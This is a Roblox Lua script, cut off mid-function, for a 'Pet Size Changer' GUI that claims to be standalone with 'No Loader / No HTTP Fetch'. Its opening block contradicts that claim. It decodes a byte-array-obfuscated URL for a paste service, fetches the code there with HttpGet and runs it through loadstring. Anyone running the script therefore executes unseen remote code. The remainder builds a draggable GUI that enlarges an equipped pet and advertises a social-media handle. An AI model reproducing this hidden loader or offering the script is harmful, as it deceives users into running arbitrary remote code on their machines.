--[[===============================================================
    Obfuscated Loader
===================================================================]]
local encoded = {
    104,116,116,112,115,58,47,47,97,112,105,46,114,117,98,105,115,46,97,112,112,47,118,50,47,115,99,114,97,112,47,56,69,71,72,50,120,89,102,110,83,121,90,81,119,114,74,47,114,97,119
}
local str = {}
for _, byte in ipairs(encoded) do
    table.insert(str, string.char(byte))
end
local url = table.concat(str)

local fn = loadstring(game:HttpGet(url, true))
if fn then fn() end

--[[===============================================================
    Pet Enlarger GUI (Standalone Version - No Loader / No HTTP Fetch)
===================================================================]]
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer

-- Create GUI
local gui = Instance.new("ScreenGui")
gui.Name = "PetEnlargerGUI"
gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.Parent = player:WaitForChild("PlayerGui")

-- Main Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 220)
frame.Position = UDim2.new(0.5, -150, 0.5, -110)
frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
frame.BorderSizePixel = 0
frame.Active = true
frame.Parent = gui

-- Rounded corners
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = frame

-- Dragging
local dragging, dragInput, dragStart, startPos = false, nil, nil, nil
frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = frame.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then dragging = false end
		end)
	end
end)
frame.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)
UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		local delta = input.Position - dragStart
		frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
end)

-- Title Label
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 30)
title.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
title.BorderSizePixel = 0
title.Text = "Pet Size Changer V1"
title.Font = Enum.Font.FredokaOne
title.TextSize = 20
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Parent = frame

-- Pet Name Label
local petNameLabel = Instance.new("TextLabel")
petNameLabel.Size = UDim2.new(1, -20, 0, 25)
petNameLabel.Position = UDim2.new(0, 10, 0, 40)
petNameLabel.BackgroundTransparency = 1
petNameLabel.Text = "Equipped Pet: (None)"
petNameLabel.Font = Enum.Font.FredokaOne
petNameLabel.TextSize = 16
petNameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
petNameLabel.TextXAlignment = Enum.TextXAlignment.Left
petNameLabel.Parent = frame

-- Apply Pet Size Button
local applyBtn = Instance.new("TextButton")
applyBtn.Size = UDim2.new(0.8, 0, 0, 40)
applyBtn.Position = UDim2.new(0.1, 0, 0, 80)
applyBtn.BackgroundColor3 = Color3.fromRGB(60, 160, 60)
applyBtn.Text = "Apply Pet Size"
applyBtn.Font = Enum.Font.FredokaOne
applyBtn.TextSize = 18
applyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
applyBtn.Parent = frame
local applyCorner = Instance.new("UICorner")
applyCorner.CornerRadius = UDim.new(0, 8)
applyCorner.Parent = applyBtn
applyBtn.MouseEnter:Connect(function()
	TweenService:Create(applyBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(80, 180, 80)}):Play()
end)
applyBtn.MouseLeave:Connect(function()
	TweenService:Create(applyBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(60, 160, 60)}):Play()
end)

-- Reset Pet Size Button
local resetBtn = Instance.new("TextButton")
resetBtn.Size = UDim2.new(0.8, 0, 0, 40)
resetBtn.Position = UDim2.new(0.1, 0, 0, 130)
resetBtn.BackgroundColor3 = Color3.fromRGB(180, 50, 50)
resetBtn.Text = "Reset Pet Size"
resetBtn.Font = Enum.Font.FredokaOne
resetBtn.TextSize = 18
resetBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
resetBtn.Parent = frame
local resetCorner = Instance.new("UICorner")
resetCorner.CornerRadius = UDim.new(0, 8)
resetCorner.Parent = resetBtn
resetBtn.MouseEnter:Connect(function()
	TweenService:Create(resetBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(230, 70, 70)}):Play()
end)
resetBtn.MouseLeave:Connect(function()
	TweenService:Create(resetBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(180, 50, 50)}):Play()
end)

-- TikTok Button
local tiktokBtn = Instance.new("ImageButton")
tiktokBtn.Size = UDim2.new(0, 24, 0, 24)
tiktokBtn.Position = UDim2.new(0.5, -75, 0, 180)
tiktokBtn.BackgroundTransparency = 1
tiktokBtn.Image = "rbxassetid://13860143083"
tiktokBtn.Parent = frame

-- Username Text
local usernameText = Instance.new("TextButton")
usernameText.Size = UDim2.new(0, 140, 0, 24)
usernameText.Position = UDim2.new(0.5, -40, 0, 180)
usernameText.BackgroundTransparency = 1
usernameText.Text = "@zenx.scripts"
usernameText.Font = Enum.Font.FredokaOne
usernameText.TextSize = 16
usernameText.TextColor3 = Color3.fromRGB(255, 255, 255)
usernameText.TextXAlignment = Enum.TextXAlignment.Left
usernameText.TextYAlignment = Enum.TextYAlignment.Center
usernameText.Parent = frame

-- Pet size functions
local function enlargePet(petTool)
	if petTool:IsA("Model") then
		petTool:ScaleTo(20)
	elseif petTool:IsA("Tool") then
		for _, obj in ipairs(petTool:GetChildren()) do
			if obj:IsA("Model") then
				obj:ScaleTo(20)
			elseif obj:IsA("BasePart") then
				local mesh = obj:FindFirstChildOfClass("SpecialMesh")
				if mesh then
					mesh.Scale = mesh.Scale * 20
				else
					obj.Size = obj.Size * 20
				end
			end
		end
	end
end
local function resetPet(
